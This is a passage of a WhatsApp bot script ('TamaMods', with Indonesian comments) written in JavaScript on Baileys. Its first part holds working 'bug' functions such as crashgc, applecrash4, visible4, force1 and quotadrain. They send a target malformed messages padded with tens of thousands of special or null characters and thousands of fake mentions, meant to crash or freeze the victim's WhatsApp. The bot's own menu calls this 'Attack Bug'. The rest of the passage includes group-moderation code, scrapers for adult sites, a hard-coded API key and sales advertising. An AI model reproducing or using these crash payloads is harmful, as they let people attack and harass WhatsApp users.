            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await TamaMods.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await TamaMods.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
   }
};
async function blankgc(TamaMods, target) {
    await TamaMods.relayMessage(target, {
    viewOnceMessage: {
      message: {
      interactiveMessage: {
      body: { text: "TamaMods".repeat(25000) },
           nativeFlowMessage: {
           messageParamsJson: JSON.stringify({
                payment_currency: "BTC",
                payment_amount: 0
             })
           }
         }
       }
     }
}, {});
}
async function crashgc(TamaMods, target) {
  await TamaMods.relayMessage(target, {
    text: "TamaModss" + "ꦽ".repeat(2500),
    mentions: target,
    contextInfo: {
      mentionedJid: target,
      isGroupMention: true
    }
  });
}
async function visible4(TamaMods, target) {
  for (let i = 0; i < 10; i++) {
    let push = [];
    let buttt = [];
    
    for (let i = 0; i < 10; i++) {
      buttt.push({
        name: "galaxy_message",
        buttonParamsJson: JSON.stringify({
          header: "\u0000".repeat(10000),
          body: "\u0000".repeat(10000),
          flow_action: "navigate",
          flow_action_payload: { screen: "FORM_SCREEN" },
          flow_cta: "\u0000",
          flow_id: "1169834181134583",
          flow_message_version: "3",
          flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        body: { text: "#TamaMods" },
        header: {
          title: "𑇂𑆵𑆴𑆿" + "\u0000".repeat(50000),
          hasMediaAttachment: false,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "591",
            height: 0,
            width: 0,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            scanLengths: [247, 201, 73, 63],
            midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        nativeFlowMessage: {
          buttons: []
        }
      });
    }

    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: {
                text: "#TamaMods" + "ꦾ".repeat(55000)
              },
              footer: { text: "\u0000" },
              header: { hasMediaAttachment: false },
              carouselMessage: { cards: [...push] }
            }
          }
        }
      },
      {}
    );

    await TamaMods.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}
async function applecrash4(TamaMods, target) {
  try {
    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "#TamaMods" + "𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "#TamaMods" + "𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(5000),
      url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`
    }

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: { locationMessage }
        }
      },
      {}
    )

    await TamaMods.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: 'meta',
          attrs: {},
          content: [
            {
              tag: 'mentioned_users',
              attrs: {},
              content: [
                {
                  tag: 'to',
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    })
  } catch (err) {
    console.error(err)
  }
}
async function visible(TamaMods, target) {
  let msg = "ꦽ".repeat(1500);
    await TamaMods.relayMessage(target, {
      locationMessage: {
        degreesLatitude: -9.09999262999,
        degreesLongitude: 199.99963118999,
        jpegThumbnail: null,
        name: "TamaMods" + msg,
        address: "\u0000" + msg,
        url: "https://t.me/TamaModss",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );
}
async function mention1(TamaMods, target) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 50 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: target,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(target, stickerMsg.message, {});

await TamaMods.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
            },
          ],
        },
      ],
    },
  ],
});
}
async function quotadrain(TamaMods, target) {
const msg = "TamaModss" + "᬴᬴᬴".repeat(15000) + "꧔꧈".repeat(15000) + "ꦽ".repeat(20000);
  await TamaMods.sendMessage(target, {
    eventMessage: {
        isCanceled: false,
        name: msg,
        description: msg,
        location: {
            degreesLatitude: 0,
            degreesLongitude: 0,
            name: msg
        },
        joinLink: "https://call.whatsapp.com/video/TamaMods",
        startTime: Math.floor(Date.now() / 1000),
        endTime: Math.floor(Date.now() / 1000) + 86400,
        extraGuestsAllowed: false
    }
}, { quoted: null });
}
async function force1(TamaMods, target) {
 const message = generateWAMessageFromContent(target, {
  ephemeralMessage: {
    message: {
    interactiveMessage: {
      body: {
      text: "༑TamaMods" + "ꦾ".repeat(10000), 
      contextInfo: {
      mentionedJid: [
  "0@s.whatsapp.net",
  ...Array.from(
  { length: 1900 },
  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
  ),
    ],
    entryPointConversionSource: "cache",
    entryPointConversionApp: "Whatsapp",
    entryPointConversionDelaySeconds: 9670,
    forwardingScore: 999,
    isForwarded: true
           }
       }, 
           nativeFlowMessage: {
            buttons: [
             {
                name: "call_permission_request", 
                buttonParamsJson: "\u0000".repeat(10000), 
                version: 3
             }, 
             {
                name: "cta_url", 
                buttonParamsJson: JSON.stringify({
                 display_text: "\x10".repeat(10000), 
                 url: "https://Wa.me/stickerpack/xxx"
                  }) 
                                    }
                              ]
                        }
                  }
             }
        }
   });
     
  await TamaMods.relayMessage(target, message.message, 
  { messageId: null, participant: { jid: target } });
}
async function notifblank(TamaMods, target) {
  try {
  const payload = {
    ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "Tama Modss" + "ꦽ".repeat(45000),
            address: "\u0000",
            url: "https://xxx." + "؂ن؃".repeat(100000) + ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: " ؂ن؃".repeat(10000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: "Tama Modss",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "\n",
                },
              },
            },
          },
        },
      },
  };

  const message = await (async () => {
    try {
      return generateWAMessageFromContent(target,
        payload,
        {}
      );
    } catch (e) {
      console.error(e);
    }
  })();

  if (message) {
    await TamaMods.relayMessage(target,
      message.message,
      { messageId: message.key.id }
    );
  }
} catch (e) {
    console.error(e);
  }
}
async function visiblecrash(TamaMods, target) {
var img = { url: "https://files.cloudkuimages.guru/images/LhEZsRX2.jpg" }
  await TamaMods.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "༑⌁⃰Vàeltr¡x Volcàn¡cཀ‌‌",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9000000) +
                  "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 555,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: false,
              renderLargerThumbnail: false,
              title: "\"🩸\"",
              body: "https://xxx.com",
              previewType: "VIDEO",
              mediaType: "VIDEO",
              thumbnail: img,
              sourceUrl: "t.me/TamaModss",
              mediaUrl: "t.me/TamaModss",
              sourceType: "X",
              sourceId: "X",
              containsAutoReply: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example",
            },
            quotedAd: {
              advertiserName: "X",
              mediaType: "IMAGE",
              jpegThumbnail: img,
              caption: "X",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            isSampled: false,
            utm: {
              utmSource: "X",
              utmCampaign: "X",
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363330283960382@newsletter",
              serverMessageId: 1,
              newsletterName: "Tama Modss",
              contentType: "UPDATE",
              accessibilityText: "X",
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}
async function callNewsletter(target) {
await TamaMods.relayMessage(target, {
callLogMesssage: { isVideo: true, callOutcome: "REJECTED", durationSecs: "1", callType: "VOICE_CHAT", participants: [{ jid: target, callOutcome: "CONNECTED" }, { jid: "0@s.whatsapp.net", callOutcome: "CONNECTED" }]}
}, {})
}

async function crashNewsletter(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      header: {
      documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
       fileLength: "9999999999999",
       pageCount: 9999999999999,
       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
       fileName: "X Document", 
       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mediaKeyTimestamp: 1735456100,
       contactVcard: true,
       caption: "Tama Modss"
      }
     },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: "trigger",
              order: {
                status: "flex_agency",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: "".repeat(10000) 
      }
   }
  }, { userJid: target });

  await TamaMods.relayMessage(target, msg.message, { 
    participant: { jid: target },
    messageId: msg.key.id 
  });
}
const nullgb = {
key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
    },
    message: {
    documentMessage: {
        contactVcard: true
      }
    }
};
      
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat]?.simi === true && !isCmd) {
    try {
        // Kirim permintaan ke API OpenAI
        const res = await axios.get(`https://www.ghostxdzz.web.id/api/ai/openai?query=${encodeURIComponent(m.text)}`);
        
        // Periksa respons API
        if (res.data.status && res.data.result?.message) {
            await Reply(res.data.result.message); // Balas pesan AI
        }
    } catch (error) {
        console.error("Error while fetching AI response:", error.message);
    }
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await TamaMods.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await TamaMods.sendMessage(m.chat, {text: `*[ ! ] [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: pantek})
await TamaMods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await TamaMods.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await TamaMods.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await TamaMods.sendMessage(m.chat, {text: `*[ ! ] [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: pantek})
await TamaMods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await TamaMods.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.antilinkwa == true) {
if (m.text.includes("wa.me/") && !m.fromMe) {
let delet = m.key.participant
let bang = m.key.id
await TamaMods.sendMessage(m.chat, {text: `
😤 *[ Link Wa.Me Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur anti link wa!`, mentions: [m.sender]}, {quoted: pantek})
await TamaMods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await TamaMods.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}

if (m.isGroup && db.settings.antitoxic == true) {
if (BadNano.includes(command)) {
let delet = m.key.participant
let bang = m.key.id
await TamaMods.sendMessage(m.chat, {text: `
😤 *[ Toxic Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur anti toxic!`, mentions: [m.sender]}, {quoted: pantek})
await TamaMods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await TamaMods.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}

if (m.isGroup && db.settings.antilinkall == true) {
if (m.text.includes("https://") && !m.fromMe) {
let delet = m.key.participant
let bang = m.key.id
await TamaMods.sendMessage(m.chat, {text: `
😤 *[ Link Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf, kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur anti link semua media!`, mentions: [m.sender]}, {quoted: pantek})
await TamaMods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await TamaMods.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}

if (m.isGroup && db.settings.autopromosi== true) {
if (m.text.includes("https://") && !m.fromMe) {
await TamaMods.sendMessage(m.chat, {text: `
*TamaMods Menyediakan⚡*
* Panel Pterodactyl Server Private
* Vps Digital Ocean
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

* *Channel Testimoni :*
https://whatsapp.com/channel/0029Vav8XGHL2ATznQc17P3A

*👤 Contact TamaMods*
* *WhatsApp Utama :*
${global.owner}
${global.sosmed}
`}, {quoted: pantek})
}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].autoai == true) {
    try {
        // Kirim permintaan ke API Blackbox
        const res = await axios.get(`https://api.neoxr.eu/api/blackbox?q=${encodeURIComponent(m.text)}&apikey=zakkigans12`);
        
        // Periksa respons API dan balas pesan
        if (res.data.status && res.data.data?.message) {
            await Reply(res.data.data.message);
        }
    } catch (error) {
        console.error("Error while fetching AI response:", error.message);
    }
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await Reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

async function reactionMessage(emo) {
			TamaMods.sendMessage(m.chat, {
				react: {
					text: emo,
					key: m.key
				}
			});
		}

async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
			if (m.message) {
				TamaMods.sendPresenceUpdate("recording", m.chat)
			}
		
				 
		async function hentaivid() {
return new Promise((resolve, reject) => {
const page = Math.floor(Math.random() * 1153)
axios.get('https://sfmcompile.club/page/'+page)
.then((data) => {
const $ = cheerio.load(data.data)
const hasil2 = []
$('#primary > div > div > ul > li > article').each(function (a, b) {
hasil2.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
})
resolve(hasil2)
})
})
}
		
async function searchVideo(query) {
  const url = `https://www.pornhub.com/video/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const videoList = [];

  $('li[data-video-segment]').each((index, element) => {
    const $element = $(element);
    
    const link = $element.find('.title a').attr('href').trim();
    const title = $element.find('.title a').text().trim();
    const uploader = $element.find('.videoUploaderBlock a').text().trim();
    const views = $element.find('.views').text().trim();
    const duration = $element.find('.duration').text().trim();
    
    const videoData = {
      link: "https://www.pornhub.com" + link,
      title: title,
      uploader: uploader,
      views: views,
      duration: duration
    };
    
    videoList.push(videoData);
  });
  
  return videoList;
}
const example = async (teks) => {
const commander = ` *Usage Examples :*\n Ketik *${prefix+command}* ${teks}`
return Reply(commander)
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
	let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//TamaMods.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}
//=============================//

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: TamaMods.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaction Open*\n\n*TamaMods* Menyediakan Produk Dibawah Ini"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*TamaMods Menyediakan*

* Vps Digital Ocean
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

* *Channel Testimoni :*
https://whatsapp.com/channel/0029Vav8XGHL2ATznQc17P3A`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat TamaMods\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat TamaMods\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Vps Digital Ocean🌟*

_*Promo Vps Digital Ocean*_
* Ram 2 Core 2 Rp 30.000
* Ram 4 Core 2 Rp 40.000
* Ram 8 Core 4 Rp 50.000
* Ram 16 Core 4 Rp 60.000
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 15 Hari
>̶>̶ Free Install Thema 8-16 Ram`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat TamaMods\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: pantek})
await TamaMods.relayMessage(target, msgii.message, {messageId: msgii.key.id})
}

			
			
//============= [ COMMANDS ] ====================================================



switch (command) {
case 'infobot':{
darkponk = fs.readFileSync('./System/media/Sql-Xxx.mp3')
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
const totalMem = os.totalmem();
TamaMods.sendMessage(m.chat, { react: { text: `🚀`, key: m.key }})
let teks = `*${ucapanWaktu}*\n\n─( 👋 ) Halo, ${m.pushName}, I'm The SimpleBot Script Bot. This Script Is Used To Explore And Take Advantage Of Gaps In The WhatsApp System. Use It Wilsely And Not For Harmful Purposes 

ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ
▢ Speed : ${latensi.toFixed(4)} Sec
▢ Runtime : ${runtime(process.uptime())}
▢ Ram : ${formatp(totalMem)}
▢ Bot Name : Simple Bot
▢ Mode : ${TamaMods.public ? "Public" : "Private"}
▢ Language : JavaScript

ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ
▢ Nama : ${pushname}
▢ Nomor : ${m.sender.split("@")[0]}
▢ Status : ${isPremium ? "Premium" : "Not Premium"}`
let sections = [{
title: '⿻  ⌜ 𝐓𝐀𝐌𝐀 - 𝐅𝐍𝐗 ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐓𝐀𝐌𝐀 - 𝐅𝐍𝐗', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
